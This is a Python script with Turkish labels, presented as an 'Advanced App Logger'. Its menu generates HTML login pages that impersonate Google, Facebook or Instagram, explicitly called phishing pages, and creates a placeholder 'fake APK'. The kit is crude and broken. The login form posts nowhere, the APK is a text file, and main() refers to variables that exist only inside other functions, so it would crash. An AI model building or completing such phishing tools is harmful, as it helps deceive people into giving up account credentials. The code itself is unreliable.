#!/usr/bin/env python3
import os
import time
from datetime import datetime

# Log dosyası ayarları
LOG_FILE = "logs.txt"

# Loglara kaynak bilgisi ekleme
def log_kaydet(kaynak, uygulama_adi, veri):
    with open(LOG_FILE, "a") as f:
        tarih = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        f.write(f"[{tarih}] [{kaynak.upper()}] [{uygulama_adi.upper()}] {veri}\n")

# HTML phishing sayfası oluşturma
def html_phishing():
    site = input("Hedef site (Google/Facebook/Instagram): ").lower()
    html_dosya = f"{site}_login.html"
    
    # HTML şablonu
    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{site.capitalize()} Giriş</title>
    </head>
    <body>
        <h1>{site.capitalize()} Hesabınıza Giriş Yapın</h1>
        <form method="POST">
            <input type="text" placeholder="E-posta/Kullanıcı Adı" name="kullanici"><br>
            <input type="password" placeholder="Şifre" name="sifre"><br>
            <button type="submit">Giriş Yap</button>
        </form>
    </body>
    </html>
    """
    
    with open(html_dosya, "w") as f:
        f.write(html_template)
    
    print(f"\n✅ {site.capitalize()} phishing sayfası oluşturuldu: {html_dosya}")
    print("ℹ Kullanıcı bilgileri 'logs.txt' dosyasına kaydedilecek.")

# Fake APK oluşturma (Simülasyon)
def fake_apk():
    app_name = input("Uygulama Adı (Ör: Google Play): ").lower()
    apk_dosya = f"{app_name}_fake.apk"
    
    print(f"\n⏳ {app_name.capitalize()} için APK hazırlanıyor...")
    time.sleep(2)
    
    # APK simülasyonu (Gerçekte derlenmez, sadece log testi için)
    with open(apk_dosya, "w") as f:
        f.write("Bu bir fake APK dosyasıdır.\n")
    
    print(f"✅ APK oluşturuldu: {apk_dosya}")
    print("ℹ Kullanıcı etkileşimleri 'logs.txt' dosyasına kaydedilecek.")

# Ana menü
def menu():
    print("""
    ╔══════════════════════════════╗
    ║   🛠️ ADVANCED APP LOGGER   ║
    ╠══════════════════════════════╣
    ║ 1. HTML Phishing Sayfası     ║
    ║ 2. Fake APK Oluştur         ║
    ║ 3. Logları Görüntüle        ║
    ║ 4. Çıkış                    ║
    ╚══════════════════════════════╝
    """)
    secim = input("Seçim yapın (1-4): ")
    return secim

# Logları göster
def loglari_goster():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            print("\n📜 LOG KAYITLARI:")
            print(f.read())
    else:
        print("\n❌ Henüz log dosyası yok.")

# Ana program
def main():
    while True:
        secim = menu()
        if secim == "1":
            html_phishing()
            log_kaydet("html", site, "Phishing sayfası oluşturuldu.")
        elif secim == "2":
            fake_apk()
            log_kaydet("apk", app_name, "Fake APK oluşturuldu.")
        elif secim == "3":
            loglari_goster()
        elif secim == "4":
            print("\n❌ Çıkış yapılıyor...")
            break
        else:
            print("\n❌ Geçersiz seçim!")

if __name__ == "__main__":
    main()